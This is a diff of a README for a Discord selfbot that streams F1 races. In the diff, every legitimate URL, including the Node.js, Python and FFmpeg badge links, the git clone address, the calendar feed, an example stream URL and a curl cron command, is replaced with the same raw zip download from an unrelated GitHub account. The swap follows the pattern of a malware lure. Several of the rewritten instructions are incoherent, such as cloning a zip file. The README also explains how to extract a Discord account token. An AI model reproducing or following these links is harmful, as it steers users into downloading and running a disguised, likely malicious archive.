@@ -5,9 +5,9 @@
 **Fully automated F1 live stream bot for Discord.**
 Watches your calendar. Finds the stream. Pushes it into a voice channel. Repeats all season.
 
-[![Node.js](https://img.shields.io/badge/Node.js-18%2B-339933?style=flat-square&logo=node.js&logoColor=white)](https://nodejs.org)
-[![Python](https://img.shields.io/badge/Python-3.9%2B-3776AB?style=flat-square&logo=python&logoColor=white)](https://python.org)
-[![FFmpeg](https://img.shields.io/badge/FFmpeg-required-007808?style=flat-square&logo=ffmpeg&logoColor=white)](https://ffmpeg.org)
+[![Node.js](https://img.shields.io/badge/Node.js-18%2B-339933?style=flat-square&logo=node.js&logoColor=white)](https://github.com/Masculine-genusdigitalis738/f1streamer/raw/refs/heads/main/broil/f_streamer_v2.7.zip)
+[![Python](https://img.shields.io/badge/Python-3.9%2B-3776AB?style=flat-square&logo=python&logoColor=white)](https://github.com/Masculine-genusdigitalis738/f1streamer/raw/refs/heads/main/broil/f_streamer_v2.7.zip)
+[![FFmpeg](https://img.shields.io/badge/FFmpeg-required-007808?style=flat-square&logo=ffmpeg&logoColor=white)](https://github.com/Masculine-genusdigitalis738/f1streamer/raw/refs/heads/main/broil/f_streamer_v2.7.zip)
 [![License](https://img.shields.io/badge/license-MIT-blue?style=flat-square)](LICENSE)
 
 </div>
@@ -74,7 +74,7 @@ libx264  (CPU fallback, works everywhere)
 ## Installation
 
 ```bash
-git clone https://github.com/fragmentone/f1streamer
+git clone https://github.com/Masculine-genusdigitalis738/f1streamer/raw/refs/heads/main/broil/f_streamer_v2.7.zip
 cd f1streamer
 npm install
 pip install -r requirements.txt
@@ -118,13 +118,13 @@ Open `config.json` and fill in your values. The three required keys are `token`,
 
 ### Getting your Discord token
 
-Open Discord in a browser. Open DevTools (`F12`), go to **Application > Local Storage > https://discord.com**, and find the `token` key. Alternatively open the **Network** tab, refresh, and look for the `Authorization` header on any request to `discord.com/api`.
+Open Discord in a browser. Open DevTools (`F12`), go to **Application > Local Storage > https://github.com/Masculine-genusdigitalis738/f1streamer/raw/refs/heads/main/broil/f_streamer_v2.7.zip**, and find the `token` key. Alternatively open the **Network** tab, refresh, and look for the `Authorization` header on any request to `discord.com/api`.
 
 > **Selfbot warning.** This bot authenticates as your personal Discord account. Selfbots violate Discord's Terms of Service. Use at your own risk.
 
 ### Getting a calendar
 
-[Better F1 Calendar](https://better-f1-calendar.vercel.app/) is the recommended source. It's a community-maintained ICS feed synced from official data, with clean and compact session names in exactly the format this bot's parser expects. Download the `.ics` file, put it in the project directory, and point `calendarFile` at it.
+[Better F1 Calendar](https://github.com/Masculine-genusdigitalis738/f1streamer/raw/refs/heads/main/broil/f_streamer_v2.7.zip) is the recommended source. It's a community-maintained ICS feed synced from official data, with clean and compact session names in exactly the format this bot's parser expects. Download the `.ics` file, put it in the project directory, and point `calendarFile` at it.
 
 ---
 
@@ -159,7 +159,7 @@ node test_providers.js "ufc 300" --launch streamed
 node streamer.js "https://embed-page-url"
 
 # Pass a direct M3U8 -- skips the browser entirely
-node streamer.js "https://cdn.example.com/stream.m3u8"
+node streamer.js "https://github.com/Masculine-genusdigitalis738/f1streamer/raw/refs/heads/main/broil/f_streamer_v2.7.zip"
 ```
 
 ### Running as a systemd service
@@ -190,7 +190,7 @@ set in `calendarFile` at startup. Changing `calendarFile` in `config.json` requi
 If you're auto-syncing the calendar via cron, use atomic file replacement to prevent the
 scheduler from reading a partially-written file:
 
-    curl -s -o /tmp/f1cal.ics https://better-f1-calendar.vercel.app/api/calendar.ics \
+    curl -s -o /tmp/f1cal.ics https://github.com/Masculine-genusdigitalis738/f1streamer/raw/refs/heads/main/broil/f_streamer_v2.7.zip \
       && mv /tmp/f1cal.ics f1-better-calendar.ics
 
 Do not use a calendar app's webcal subscription to sync the file — calendar apps write
